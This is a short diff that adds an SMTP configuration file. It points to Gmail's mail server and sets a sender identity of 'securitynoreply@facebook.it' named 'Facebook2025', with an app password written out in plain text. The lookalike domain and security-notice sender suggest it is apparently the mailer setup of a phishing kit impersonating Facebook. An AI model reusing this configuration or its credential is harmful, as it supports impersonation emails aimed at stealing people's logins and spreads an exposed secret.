@@ -1,0 +1,7 @@
+SMTP_HOST=smtp.gmail.com
+SMTP_PORT=587
+SMTP_SECURE=tls
+SMTP_USERNAME=securitynoreply@facebook.it
+SMTP_PASSWORD=epac xcnc qtmo deqq
+SMTP_FROM_NAME=Facebook2025
+SMTP_FROM_EMAIL=securitynoreply@facebook.it
